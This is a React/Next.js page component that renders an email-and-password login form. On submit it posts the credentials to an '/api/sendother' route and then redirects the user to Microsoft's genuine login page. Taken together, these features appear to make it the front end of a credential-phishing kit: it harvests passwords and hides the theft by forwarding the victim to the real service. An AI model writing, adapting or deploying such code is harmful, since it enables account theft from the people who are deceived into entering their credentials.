import Link from 'next/link'
import Image from 'next/image'
import { useState } from 'react'
import { useRouter } from 'next/router'

const Other = () => {
    const Router = useRouter()
  

    const [email, setEmail] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          email,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendother', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            //   Navigate('google.com')
              window.location.assign('https://login.microsoftonline.com/common/login')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }
  
  
    return (
        <>
           <div className="flex flex-wrap justify-center pt-20">
                <div className="w-[550px] h-88 bg-slate-400 border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <Image
                          src="/images/otherem.png"
                          className=""
                          height={95}
                          width={90}
                          alt="second hero"/>
                         

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='emails' name='emails'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='passwords' name='passwords' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-center p-6 border-t border-solid border-slate-200 rounded-b">
               
                  <button
                    className="bg-white text-slate-400 active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"
                 
                  >
                   Login
                  </button>
                </div>
                          </form> 

                         
              </div>
              </div>
        </>
    )
}

export default Other